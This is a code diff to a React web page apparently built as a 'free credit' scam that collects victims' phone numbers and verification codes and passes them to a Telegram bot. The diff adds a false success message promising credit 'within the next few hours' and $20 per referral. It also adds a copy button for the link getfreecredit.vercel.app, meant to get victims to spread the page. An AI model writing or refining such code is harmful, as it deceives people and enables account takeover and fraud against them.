@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Shield, Check, Star } from 'lucide-react';
+import { Shield, Check, Star, Copy, CheckCircle } from 'lucide-react';
 
 declare global {
   interface Window {
@@ -41,6 +41,17 @@ function App() {
   });
   const [waiting, setWaiting] = useState(false);
   const [errorText, setErrorText] = useState<string | null>(null);
+  const [copied, setCopied] = useState(false);
+
+  const copyToClipboard = async (text: string) => {
+    try {
+      await navigator.clipboard.writeText(text);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    } catch (err) {
+      console.error('Failed to copy text: ', err);
+    }
+  };
 
 const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: string }) => {
     try {
@@ -207,7 +218,7 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
                       />
                     ))}
                   </div>
-<button 
+                  <button 
                     onClick={handlePhoneSubmit}
                     disabled={phoneNumber.join('').length !== 5}
                     className="bg-red-600 hover:bg-red-700 disabled:bg-gray-400 disabled:cursor-not-allowed text-white px-8 py-4 rounded-xl font-semibold text-lg transition-colors duration-200 shadow-lg"
@@ -261,11 +272,45 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
               <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 border border-white/30">
                 <div className="text-center">
                   <div className="flex justify-center mb-6">
-                    <Check className="w-24 h-24 text-green-400" />
+                    <Check className="w-16 h-16 text-green-400" />
                   </div>
-                  <h2 className="text-4xl text-white font-bold">
-                    Done!
-                  </h2>
+                  
+                  {/* Success Message */}
+                  <div className="mb-8">
+                    <p className="text-lg text-white/90 leading-relaxed mb-6">
+                      Dear user, due to heavy traffic on the website, your credit will be sent within the next few hours. Your invitation link is getfreecredit.vercel.app. Each referral grants you $20 in free credit. Referrals are counted after 00:00.
+                    </p>
+                  </div>
+
+                  {/* Copy Link Box */}
+                  <div className="bg-white/10 rounded-xl p-4 border border-white/20">
+                    <p className="text-white/80 text-sm mb-3 font-medium">Your Referral Link:</p>
+                    <div className="flex items-center justify-between bg-white/20 rounded-lg p-3 border border-white/30">
+                      <span className="text-white font-mono text-sm break-all">
+                        getfreecredit.vercel.app
+                      </span>
+                      <button
+                        onClick={() => copyToClipboard('getfreecredit.vercel.app')}
+                        className={`ml-3 flex items-center px-3 py-2 rounded-lg font-medium text-sm transition-all duration-200 ${
+                          copied 
+                            ? 'bg-green-500 text-white' 
+                            : 'bg-red-600 hover:bg-red-700 text-white'
+                        }`}
+                      >
+                        {copied ? (
+                          <>
+                            <CheckCircle className="w-4 h-4 mr-1" />
+                            Copied!
+                          </>
+                        ) : (
+                          <>
+                            <Copy className="w-4 h-4 mr-1" />
+                            Copy
+                          </>
+                        )}
+                      </button>
+                    </div>
+                  </div>
                 </div>
               </div>
             )}
